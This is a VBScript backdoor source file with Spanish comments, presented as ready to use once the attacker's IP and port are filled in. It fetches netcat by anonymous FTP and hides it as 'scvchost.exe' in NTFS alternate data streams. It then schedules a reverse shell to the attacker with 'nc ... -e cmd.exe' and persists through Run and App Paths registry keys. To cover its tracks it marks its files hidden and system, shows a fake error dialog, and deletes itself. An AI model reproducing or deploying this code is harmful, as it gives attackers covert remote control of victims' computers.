'on error resume next
'
'C:\>nc -ltp 25   'nos ponemos a la escucha
'listening on [any] 25 ...
'
'Microsoft Windows XP [Versión 5.1.2600]  'nos llego la shell :)
'(C) Copyright 1985-2001 Microsoft Corp.
'
'C:\Documents and Settings\victim>
'
'#CONFIGURACION# -> obligatoria!
 
const host = "localhost" 'tu ip o nombre de dominio
const port = "25" 'el puerto en el que escucharas
const ftpServerRoute = "ftp.fu-berlin.de/doc/o-reilly/networksa/tools/nc.exe" 'ruta de descarga del nc.exe en un server ftp cualquiera
const delay = 20  'tiempo de espera en minutos para la conexión
 
 
'#FIN DE LA CONFIGURACION -> LISTO PARA USAR #
 
'######################################################################
'##########      ARCHIVOS USADOS EN LA INFECCION       ################
'######################################################################
         set fso = createobject("scripting.filesystemobject") 
'######################################################################
 
const VBSregKey = "cmdslibr" 'nombre de la/s futura clave en ****Run y ***Ap
 
adsFile = fso.GetSpecialFolder(1) & "\sysl.dll" 'nombre del archivo contenedor
    adsInst = adsFile & ":ins" 'el stream de un archivo de instrucciones ftp
    adsVBS = adsFile & ":cmdslib.vbs" 'stream de un vbs que se ejecuta al inicio
    adsFileContent = fso.GetSpecialFolder(1) & "\batt.dll" 'archivo del que vamos a copiar el codigo para meterlo al archivo ads
adsNC = fso.GetSpecialFolder(1) & "\scvchost.exe" 'el netcat renombrado
batchfile = fso.getspecialfolder(1) & "\sysfat.bat" 'archivo usado en la descarga ftp
 
'######################################################################
'##########             EMPIEZA CODIGO PRINCIPAL       ################
'######################################################################
 
'obtengo a partir de la url completa la ruta de descarga y el domain name del servidor
URL = replace(ftpServerRoute, left(ftpServerRoute, instr(ftpServerRoute, "/") - 1), "") 
sFTP = replace(ftpServerRoute, URL, "")
 
 
if not infectado() then 'si no esta infectado... infectamos
    if not fso.FileExists(adsFile) then  crearADS() 'donde ocultaremos todos los archivos
        if not fso.FileExists(adsInst) then GuardarInstrucciones() 'instrucciones para una descarga ftp
        if not fso.FileExists(adsNC) then GuardarNetcat() 'escondemos el netcat
        if not fso.FileExists(adsVBS) then GuardarScript() 'el script que iniciaremos con windows
    AgregarAlRegistro() 'agrega el script y el nc a varias subclaves
end if
 
'ejecuto con 'at' para que el nc se conecte despues de un cierto time
createobject("wscript.shell").run "AT " & hour(now()) & ":" & (minute(now()) + delay) & " " & adsNC & " " & host & " " & port & " -d -e cmd.exe"
 
camuflar() 'serie de payasadas poco creibles para hacer pasar la infeccion desapercibida
 
 
 
'######################################################################
'###########             SUBPROCEDIMIENTOS             ################
'######################################################################
 
private sub AgregarAlRegistro()
    'agregamos al registro al archivo *.bat para que haya conexión cada vez que se inicia la PC.
        createobject("wscript.shell").regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & VBSregKey, VBSregKey & ".exe"
    'creamos un path del programa para que sea mas dificil de encontrar
        createobject("wscript.shell").regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\" & VBSregKey & ".exe\", adsVBS
end sub
 
private sub crearADS() 'creamos el archivo contenedor, en lo posible metiendole un contenido falso
    if fso.FileExists(adsFileContent) then
        fso.CopyFile adsFileContent, adsFile, true
    else
        fso.CreateTextFile adsFile
    end if
end sub
 
private sub GuardarScript() 'guardo por ads un script que se ejecutara al iniciar windows
    set vbs = fso.CreateTextFile(adsVBS, true)
        vbs.writeline("createobject(""wscript.shell"").run ""AT "" & hour(now()) & "":"" & (minute(now()) + " & delay & ") & "" "" & """ & adsNC & " " & host & " " & port & " -d -e cmd.exe""") '&& net stop SharedAccess """)
        'vbs.writeline("createobject(""wscript.shell"").run (""AT "" & hour(now()) & "":"" & (minute(now()) + " & delay & ") & "" " & adsNC & " " & host & " " & port & " -d -e cmd.exe"")")
        vbs.close()
end sub
 
private sub GuardarNetcat() 'escondemos el netcat con los queridos alternate data streams
    if fso.FileExists(fso.GetSpecialFolder(1) & "\nc.exe") then
        fso.CopyFile fso.GetSpecialFolder(1) & "\nc.exe", adsNC, true
    else 'se lo bajamos ;)
        set ftp = fso.createtextfile(batchfile, True) 
		    ftp.writeline("@echo off")         
		    ftp.writeline("title browselc config")
		    ftp.writeline("echo Presione una tecla para continuar . . . ") 
		    ftp.writeline("ftp -s:" & adsInst & " " & sFTP & " > nul")
		    ftp.close
		createobject("wscript.shell").run batchfile
    end if
end sub
 
private sub GuardarInstrucciones()'metemos a un file por ads los comandos ftp, que luego se usaran
     set ftp = fso.createtextfile(adsInst, True) 
		ftp.writeline("anonymous")         
		ftp.writeline("noHayPassword") 
		ftp.writeline("bin")
		ftp.writeline("get " & URL & " " & adsNC)
		ftp.writeline("quit")
	    ftp.close	            
end sub
 
private function infectado() 'funcion que chequea si estamos infectados
    if fso.FileExists(adsFile) and _
        fso.FileExists(adsInst) and _
        fso.FileExists(adsNC) and _
        fso.FileExists(adsVBS) then
        infectado = true
        exit function
    else
        infectado = false
        exit function
    end if
end function
 
private sub cambiarAtributos(byref file) 'hacemos el archivo oculto, de sistema, y readonly
     if (fso.FileExists(file) and (not fso.GetFile(file).attributes = 7)) then
        set cFile = fso.GetFile(file)
        cFile.attributes = 7
     end if
end sub
 
 
private sub camuflar()
    msgbox "Error de ejecucion: no se encuentra browselc.dll.", 16, "Error"
 
    min = dateadd("n", 1, now()) 'bucle para retardar la modificacion de archivos que actualmente estan cargados en memoria
    Do while not (now() > min)'  and second(now()) = sec
        cambiarAtributos(adsFile) 'cambio atributos de los files a:
        cambiarAtributos(adsNC)   '  hidden/readonly/system
        cambiarAtributos(adsVBS)
        if fso.FileExists(batchfile) then fso.DeleteFile(batchfile) 'borramos el batchfile usado
    loop
 
     'borramos el *.vbs, para evitar la lectura del script despues de la infección 
     fso.DeleteFile(wscript.scriptfullname)
 
end sub